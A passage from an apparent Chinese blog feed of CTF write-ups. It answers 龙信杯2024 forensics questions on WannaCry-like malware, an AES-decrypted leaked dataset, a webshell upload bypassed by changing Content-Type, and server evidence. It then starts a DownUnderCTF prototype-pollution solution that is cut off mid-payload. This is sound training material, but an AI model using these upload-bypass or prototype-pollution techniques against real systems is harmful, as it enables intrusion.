<h2 id="19-接上题，恶意程序偷取数据的发件邮箱密码是多少？-标准格式：abc123"><a href="#19-接上题，恶意程序偷取数据的发件邮箱密码是多少？-标准格式：abc123" class="headerlink" title="19.接上题，恶意程序偷取数据的发件邮箱密码是多少？(标准格式：abc123)"></a>19.接上题，恶意程序偷取数据的发件邮箱密码是多少？(标准格式：abc123)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-213017792.png" class="">  
<h2 id="20-接上题，恶意程序定义收发件的地址函数是什么？-标准格式：a"><a href="#20-接上题，恶意程序定义收发件的地址函数是什么？-标准格式：a" class="headerlink" title="20.接上题，恶意程序定义收发件的地址函数是什么？(标准格式：a)"></a>20.接上题，恶意程序定义收发件的地址函数是什么？(标准格式：a)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-213144138.png" class="">  
<h1 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h1><h2 id="1-分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？-标准格式：1A23456ABCD"><a href="#1-分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？-标准格式：1A23456ABCD" class="headerlink" title="1.分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？(标准格式：1A23456ABCD)"></a>1.分析计算机检材，嫌疑人在将其侵公数据出售前在Pycharm中进行了AES加密，用于加密的key是多少？(标准格式：1A23456ABCD)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-214530637.png" class="">  
<p>仿真后打开pycharm</p>
<h2 id="2-分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？-标准格式：13013524420"><a href="#2-分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？-标准格式：13013524420" class="headerlink" title="2.分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？(标准格式：13013524420)"></a>2.分析计算机检材，身份证为”371963195112051505”这个人的手机号码是多少？(标准格式：13013524420)</h2><p>使用解密脚本解密，计算机中的加密文件<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_data, key, iv</span>):</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)  <span class="comment"># 解密</span></span><br><span class="line">    <span class="keyword">return</span> decrypted_data.decode()</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;65B2564BG89F16G9&#x27;</span>  <span class="comment"># 与加密时相同</span></span><br><span class="line">iv = <span class="string">b&#x27;83E6CBEF547944CF&#x27;</span>  <span class="comment"># 与加密时相同</span></span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;encrypted_data.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;decrypted_data.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_data</span>(<span class="params">input_file, output_file, key, iv</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> tqdm(f_in, desc=<span class="string">&quot;Processing&quot;</span>):</span><br><span class="line">            parts = line.strip().split(<span class="string">&#x27;,&#x27;</span>)  <span class="comment"># 分割行</span></span><br><span class="line">            index = parts[<span class="number">0</span>]  <span class="comment"># 获取索引</span></span><br><span class="line">            f_out.write(index + <span class="string">&quot;,&quot;</span>)  <span class="comment"># 写入索引</span></span><br><span class="line"></span><br><span class="line">            decrypted_parts = []</span><br><span class="line">            <span class="keyword">for</span> part <span class="keyword">in</span> parts[<span class="number">1</span>:]:</span><br><span class="line">                <span class="comment"># 将十六进制字符串转换为字节</span></span><br><span class="line">                encrypted_part = <span class="built_in">bytes</span>.fromhex(part)</span><br><span class="line">                decrypted_data = aes_decrypt(encrypted_part, key, iv)  <span class="comment"># 解密</span></span><br><span class="line">                decrypted_parts.append(decrypted_data)</span><br><span class="line"></span><br><span class="line">            f_out.write(<span class="string">&quot;,&quot;</span>.join(decrypted_parts) + <span class="string">&quot;\n&quot;</span>)  <span class="comment"># 写入解密后的数据</span></span><br><span class="line"></span><br><span class="line">process_data(input_file, output_file, key, iv)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密完成。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-220131875.png" class=""><br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-220153869.png" class=""><br>15075547510</p>
<h2 id="3-分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？-身份证不甄别真假-标准格式：100"><a href="#3-分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？-身份证不甄别真假-标准格式：100" class="headerlink" title="3.分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？(身份证不甄别真假)(标准格式：100)"></a>3.分析计算机检材，对解密后的身份证数据列进行单列去重操作，重复的身份证号码数量是多少？(身份证不甄别真假)(标准格式：100)</h2><h2 id="4-分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？-标准格式：100"><a href="#4-分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？-标准格式：100" class="headerlink" title="4.分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？(标准格式：100)"></a>4.分析计算机检材，接上题，根据身份证号码（第17位）分析性别，男性的数据是多少条？(标准格式：100)</h2><h2 id="5-分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？-标准格式：100"><a href="#5-分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？-标准格式：100" class="headerlink" title="5.分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？(标准格式：100)"></a>5.分析计算机检材，接上题，对解密后的数据文件进行分析，甄别身份证号码性别值与标识性别不一致的数量是多少？(标准格式：100)</h2><h2 id="6-分析计算机检材，计算机中存在的“VPN”工具版本是多少？-标准格式：1-1"><a href="#6-分析计算机检材，计算机中存在的“VPN”工具版本是多少？-标准格式：1-1" class="headerlink" title="6.分析计算机检材，计算机中存在的“VPN”工具版本是多少？(标准格式：1.1)"></a>6.分析计算机检材，计算机中存在的“VPN”工具版本是多少？(标准格式：1.1)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-225948225.png" class="">  
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-230013994.png" class="">  
<p>4.4</p>
<h2 id="7-分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？-标准格式：http-xxx-xx-x-xxx"><a href="#7-分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？-标准格式：http-xxx-xx-x-xxx" class="headerlink" title="7.分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？(标准格式：http://xxx.xx/x/xxx)"></a>7.分析计算机检材，计算机中存在的“VPN”节点订阅地址是什么？(标准格式：<a href="http://xxx.xx/x/xxx">http://xxx.xx/x/xxx</a>)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-230347474.png" class="">  
<h2 id="8-分析计算机检材，eduwcry压缩包文件的解压密码是什么？-标准格式：abcabc"><a href="#8-分析计算机检材，eduwcry压缩包文件的解压密码是什么？-标准格式：abcabc" class="headerlink" title="8.分析计算机检材，eduwcry压缩包文件的解压密码是什么？(标准格式：abcabc)"></a>8.分析计算机检材，eduwcry压缩包文件的解压密码是什么？(标准格式：abcabc)</h2><p>yasuomima密码管理里有密码<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-231457642.png" class="">  </p>
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-231437359.png" class="">  
<p>搜狗词库里也有</p>
<h2 id="9-分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。-标准格式：全小写"><a href="#9-分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。-标准格式：全小写" class="headerlink" title="9.分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。(标准格式：全小写)"></a>9.分析计算机检材，接上题，请问恶意程序释放压缩包的md5值是多少。(标准格式：全小写)</h2><p>通过pestudio可以查看这个病毒会释放一个压缩包<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-232901719.png" class=""><br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241030-232838843.png" class=""><br>导出后查看md5</p>
<h2 id="10-分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？-标准格式：http-xxx-xxx-xxx-xxx-zip"><a href="#10-分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？-标准格式：http-xxx-xxx-xxx-xxx-zip" class="headerlink" title="10.分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？(标准格式：http://xxx.xxx/xxx/xxx.zip)"></a>10.分析计算机检材，接上题，请问恶意程序记录的洋葱浏览器下载地址是多少？(标准格式：<a href="http://xxx.xxx/xxx/xxx.zip">http://xxx.xxx/xxx/xxx.zip</a>)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-203524347.png" class="">  
<p>丢个vscode进去,在病毒文件夹搜索<a href="https://即可">https://即可</a><br><a href="https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip">https://dist.torproject.org/torbrowser/6.5.1/tor-win32-0.2.9.10.zip</a></p>
<h2 id="11-分析计算机检材，接上题，请问恶意程序解密了t-wnry后该dll的md5值是多少。-标准格式：全小写"><a href="#11-分析计算机检材，接上题，请问恶意程序解密了t-wnry后该dll的md5值是多少。-标准格式：全小写" class="headerlink" title="11.分析计算机检材，接上题，请问恶意程序解密了t.wnry后该dll的md5值是多少。(标准格式：全小写)"></a>11.分析计算机检材，接上题，请问恶意程序解密了t.wnry后该dll的md5值是多少。(标准格式：全小写)</h2><p>要逆向动调….</p>
<h2 id="12-分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill-exe。-标准格式：2"><a href="#12-分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill-exe。-标准格式：2" class="headerlink" title="12.分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill.exe。(标准格式：2)"></a>12.分析计算机检材，接上题，恶意程序运行起来后第一个循环调用了几次taskkill.exe。(标准格式：2)</h2><h2 id="13-分析计算机检材，接上题，请问-WanaDecryptor-exe-lnk文件是通过什么函数创建的。-标准格式：Aabcdef"><a href="#13-分析计算机检材，接上题，请问-WanaDecryptor-exe-lnk文件是通过什么函数创建的。-标准格式：Aabcdef" class="headerlink" title="13.分析计算机检材，接上题，请问@WanaDecryptor@.exe.lnk文件是通过什么函数创建的。(标准格式：Aabcdef)"></a>13.分析计算机检材，接上题，请问@WanaDecryptor@.exe.lnk文件是通过什么函数创建的。(标准格式：Aabcdef)</h2><h2 id="14-分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的-标准格式：sub-xxx"><a href="#14-分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的-标准格式：sub-xxx" class="headerlink" title="14.分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的(标准格式：sub_xxx)"></a>14.分析计算机检材，接上题，恶意程序修改系统桌面壁纸是在哪个函数实现的(标准格式：sub_xxx)</h2><h2 id="15-分析计算机检材，VeraCrypt加密容器的密码是什么？-标准格式：abc"><a href="#15-分析计算机检材，VeraCrypt加密容器的密码是什么？-标准格式：abc" class="headerlink" title="15.分析计算机检材，VeraCrypt加密容器的密码是什么？(标准格式：abc)"></a>15.分析计算机检材，VeraCrypt加密容器的密码是什么？(标准格式：abc)</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-205809455.png" class="">  
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-205827505.png" class="">  
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241031-205836337.png" class="">  
<p>解压e盘的dd文件</p>
<h2 id="16-分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？-标准格式：12345"><a href="#16-分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？-标准格式：12345" class="headerlink" title="16.分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？(标准格式：12345)"></a>16.分析计算机检材，其中存在一个苹果手机备份包，手机备份包的密码是什么？(标准格式：12345)</h2><h2 id="17-分析计算机检材，接上题，机主实际篡改多少条微信数据？-标准格式：1"><a href="#17-分析计算机检材，接上题，机主实际篡改多少条微信数据？-标准格式：1" class="headerlink" title="17.分析计算机检材，接上题，机主实际篡改多少条微信数据？(标准格式：1)"></a>17.分析计算机检材，接上题，机主实际篡改多少条微信数据？(标准格式：1)</h2><h2 id="18-分析计算机检材，接上题，机主共存款了多少金额？-标准格式：10万"><a href="#18-分析计算机检材，接上题，机主共存款了多少金额？-标准格式：10万" class="headerlink" title="18.分析计算机检材，接上题，机主共存款了多少金额？(标准格式：10万)"></a>18.分析计算机检材，接上题，机主共存款了多少金额？(标准格式：10万)</h2><h2 id="19-分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？-标准格式：全小写"><a href="#19-分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？-标准格式：全小写" class="headerlink" title="19.分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？(标准格式：全小写)"></a>19.分析计算机检材，在手机模拟器中勒索apk软件的sha256值是什么？(标准格式：全小写)</h2><h2 id="20-分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？-标准格式：qwer-com"><a href="#20-分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？-标准格式：qwer-com" class="headerlink" title="20.分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？(标准格式：qwer.com)"></a>20.分析计算机检材，接上题，请问勒索apk软件的解锁密码是什么？(标准格式：qwer.com)</h2><h1 id="流量取证"><a href="#流量取证" class="headerlink" title="流量取证"></a>流量取证</h1><h2 id="1-分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）"><a href="#1-分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）" class="headerlink" title="1.分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）"></a>1.分析流量包检材，给出管理员对web环境进行管理的工具名。（标准格式：小皮）</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-164631039.png" class="">  
<p>我们可以看到有像check.bt.cn发送dns请求即其为宝塔</p>
<h2 id="2-分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127-0-0-1）"><a href="#2-分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127-0-0-1）" class="headerlink" title="2.分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127.0.0.1）"></a>2.分析流量包检材，给出攻击者的ip地址是多少。（标准格式：127.0.0.1）</h2><p>192.168.209.135<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-142507715.png" class="">  </p>
<h2 id="3-分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）"><a href="#3-分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）" class="headerlink" title="3.分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）"></a>3.分析流量包检材，给出攻击者爆破出的网站非管理员用户名是。（标准格式：admin）</h2><h2 id="4-分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：-abc-html）"><a href="#4-分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：-abc-html）" class="headerlink" title="4.分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：/abc.html）"></a>4.分析流量包检材，攻击者进行目录扫描得到的具有后门的页面url路径为。（标准格式：/abc.html）</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-165626486.png" class="">  
<p>搜索目录扫描为200的扫描目录<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-165537979.png" class=""><br>发现up_load.php和html<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-165814510.png" class=""><br>up_load.html</p>
<h2 id="5-分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）"><a href="#5-分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）" class="headerlink" title="5.分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）"></a>5.分析流量包检材，攻击者通过修改请求包中的哪个字段导致恶意文件成功上传。（标准格式：test-type）</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170505718.png" class="">  
<img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170719039.png" class="">  
<p>搜索up_load可以找到上传的流量<br>寻找上传成功的流量<br><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170833003.png" class=""><br>可以发现修改了MIME头就成功上传<br>Content-Type:</p>
<h2 id="6-分析流量包检材，攻击者上传成功的恶意文件-该文件的临时存放路径是。（标准格式：-abc-edf）"><a href="#6-分析流量包检材，攻击者上传成功的恶意文件-该文件的临时存放路径是。（标准格式：-abc-edf）" class="headerlink" title="6.分析流量包检材，攻击者上传成功的恶意文件, 该文件的临时存放路径是。（标准格式：/abc/edf）"></a>6.分析流量包检材，攻击者上传成功的恶意文件, 该文件的临时存放路径是。（标准格式：/abc/edf）</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-170923989.png" class="">  
<p>/tmp/php7Ndiwg</p>
<h2 id="7-分析流量包检材，服务器php配置文件的存放位置（标准格式：-www-sev-php-ini）"><a href="#7-分析流量包检材，服务器php配置文件的存放位置（标准格式：-www-sev-php-ini）" class="headerlink" title="7.分析流量包检材，服务器php配置文件的存放位置（标准格式：/www/sev/php.ini）"></a>7.分析流量包检材，服务器php配置文件的存放位置（标准格式：/www/sev/php.ini）</h2><img src="/2024/10/30/%E9%BE%99%E4%BF%A1%E6%9D%AF2024/IMG_20241101-173031562.png" class="">  
<p>AES解密，iv全填0即可</p>
<h2 id="8-分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）"><a href="#8-分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）" class="headerlink" title="8.分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）"></a>8.分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）</h2><h2 id="9-分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：-tmp-pass）"><a href="#9-分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：-tmp-pass）" class="headerlink" title="9.分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：/tmp/pass）"></a>9.分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：/tmp/pass）</h2><h2 id="10-分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）"><a href="#10-分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）" class="headerlink" title="10.分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）"></a>10.分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）</h2><h1 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h1><h2 id="1-分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？-标准格式：-xxx-xxx-xxx-xxx"><a href="#1-分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？-标准格式：-xxx-xxx-xxx-xxx" class="headerlink" title="1.分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？(标准格式：/xxx/xxx/xxx.xxx)"></a>1.分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？(标准格式：/xxx/xxx/xxx.xxx)</h2><h2 id="2-分析服务器检材，服务器ssh端口是多少？-标准格式：1234"><a href="#2-分析服务器检材，服务器ssh端口是多少？-标准格式：1234" class="headerlink" title="2.分析服务器检材，服务器ssh端口是多少？(标准格式：1234)"></a>2.分析服务器检材，服务器ssh端口是多少？(标准格式：1234)</h2><h2 id="3-分析服务器检材，服务器docker内有多少个镜像。-标准格式：100"><a href="#3-分析服务器检材，服务器docker内有多少个镜像。-标准格式：100" class="headerlink" title="3.分析服务器检材，服务器docker内有多少个镜像。(标准格式：100)"></a>3.分析服务器检材，服务器docker内有多少个镜像。(标准格式：100)</h2><h2 id="4-分析服务器检材，服务器内sqlserver默认账号的密码是？-标准格式：xxx"><a href="#4-分析服务器检材，服务器内sqlserver默认账号的密码是？-标准格式：xxx" class="headerlink" title="4.分析服务器检材，服务器内sqlserver默认账号的密码是？(标准格式：xxx)"></a>4.分析服务器检材，服务器内sqlserver默认账号的密码是？(标准格式：xxx)</h2><h2 id="5-分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？-标准格式：https-xxx"><a href="#5-分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？-标准格式：https-xxx" class="headerlink" title="5.分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？(标准格式：https://xxx)"></a>5.分析服务器检材，服务器内sqlserver存放了阿里云存储下载地址，该下载地址是？(标准格式：<a href="https://xxx">https://xxx</a>)</h2><h2 id="6-分析服务器检材，服务器内sqlserver内“cmf-user-action-log”表，表内存在的用户操作日志，一共操作次数是多少？-标准格式：100"><a href="#6-分析服务器检材，服务器内sqlserver内“cmf-user-action-log”表，表内存在的用户操作日志，一共操作次数是多少？-标准格式：100" class="headerlink" title="6.分析服务器检材，服务器内sqlserver内“cmf_user_action_log”表，表内存在的用户操作日志，一共操作次数是多少？(标准格式：100)"></a>6.分析服务器检材，服务器内sqlserver内“cmf_user_action_log”表，表内存在的用户操作日志，一共操作次数是多少？(标准格式：100)</h2><h2 id="7-分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？-标准格式：-xxx-xxx"><a href="#7-分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？-标准格式：-xxx-xxx" class="headerlink" title="7.分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？(标准格式：/xxx/xxx)"></a>7.分析服务器检材，该服务器正在使用的数据库的持久化目录是什么？(标准格式：/xxx/xxx)</h2><h2 id="8-分析服务器检材，该网站后台正在使用的数据库有多少个集合？-标准格式：100"><a href="#8-分析服务器检材，该网站后台正在使用的数据库有多少个集合？-标准格式：100" class="headerlink" title="8.分析服务器检材，该网站后台正在使用的数据库有多少个集合？(标准格式：100)"></a>8.分析服务器检材，该网站后台正在使用的数据库有多少个集合？(标准格式：100)</h2><h2 id="9-分析服务器检材，该网站的后台登录地址是？-标准格式：-xxx-xxx-xxx-全小写，不加域名"><a href="#9-分析服务器检材，该网站的后台登录地址是？-标准格式：-xxx-xxx-xxx-全小写，不加域名" class="headerlink" title="9.分析服务器检材，该网站的后台登录地址是？(标准格式：/xxx/xxx.xxx 全小写，不加域名)"></a>9.分析服务器检材，该网站的后台登录地址是？(标准格式：/xxx/xxx.xxx 全小写，不加域名)</h2><h2 id="10-分析服务器检材，该网站后台使用的管理员加密算法是？-标准格式：全大写"><a href="#10-分析服务器检材，该网站后台使用的管理员加密算法是？-标准格式：全大写" class="headerlink" title="10.分析服务器检材，该网站后台使用的管理员加密算法是？(标准格式：全大写)"></a>10.分析服务器检材，该网站后台使用的管理员加密算法是？(标准格式：全大写)</h2><h2 id="11-分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？-标准格式：x-x-x-x"><a href="#11-分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？-标准格式：x-x-x-x" class="headerlink" title="11.分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？(标准格式：x.x.x.x)"></a>11.分析服务器检材，该网站最早使用超级管理员进行删除管理员操作的IP地址是？(标准格式：x.x.x.x)</h2><h2 id="12-分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？-标准格式：123456"><a href="#12-分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？-标准格式：123456" class="headerlink" title="12.分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？(标准格式：123456)"></a>12.分析服务器检材，该网站后台上传过sha256值为“b204ad1f475c7716daab9afb5f8d61815c508f2a2b1539bc1f42fe2f212b30d1”的压缩包文件，该文件内的账单交易订单号是多少？(标准格式：123456)</h2><h2 id="13-分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？-标准格式：-xxx-xxx-全小写，不加域名"><a href="#13-分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？-标准格式：-xxx-xxx-全小写，不加域名" class="headerlink" title="13.分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？(标准格式：/xxx/xxx 全小写，不加域名)"></a>13.分析服务器检材，该网站存在网站数据库备份功能，该功能的接口地址是？(标准格式：/xxx/xxx 全小写，不加域名)</h2><h2 id="14-分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？-标准格式：100-00"><a href="#14-分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？-标准格式：100-00" class="headerlink" title="14.分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？(标准格式：100.00)"></a>14.分析服务器检材，该网站存放银行卡信息数据表中，其中信息数量前十的公司对应旗下visa银行卡一共有多少金额？(标准格式：100.00)</h2><h2 id="15-分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？-标准标准格式：100"><a href="#15-分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？-标准标准格式：100" class="headerlink" title="15.分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？(标准标准格式：100)"></a>15.分析服务器检材，该网站在2023年二月一共获取了多少条通信记录？(标准标准格式：100)</h2><h2 id="16-分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？-标准格式：ABCDE"><a href="#16-分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？-标准格式：ABCDE" class="headerlink" title="16.分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？(标准格式：ABCDE)"></a>16.分析服务器检材，该网站的一条管理员信息存在数据篡改，请分析是哪个管理员信息遭到篡改，该管理员用户名是？(标准格式：ABCDE)</h2>]]></content>
  </entry>
  <entry>
    <title>downunderctf</title>
    <url>/2024/11/16/downunderctf/</url>
    <content><![CDATA[<h1 id="来复现复现国际赛"><a href="#来复现复现国际赛" class="headerlink" title="来复现复现国际赛"></a>来复现复现国际赛</h1><h1 id="co2"><a href="#co2" class="headerlink" title="co2"></a>co2</h1><p>这题我们看代码会发现代码量会相比国内的比赛大一点,但其实难度并不高。只是其引入了数据库导致其代码相对难读一点。当其实难度不高。</p>
<img src="/2024/11/16/downunderctf/IMG_20241116-150249836.png" class="">  
<p>我们看代码可以发现其只要flag为”true”就可以得到flag。<br><img src="/2024/11/16/downunderctf/IMG_20241116-150527363.png" class=""><br>flag是一个从环境变量读取flag的变量<br>而在save_feedback路由存在原型链污染那么我们直接将变量flag污染为true不就好了</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;rating&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;referred&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span 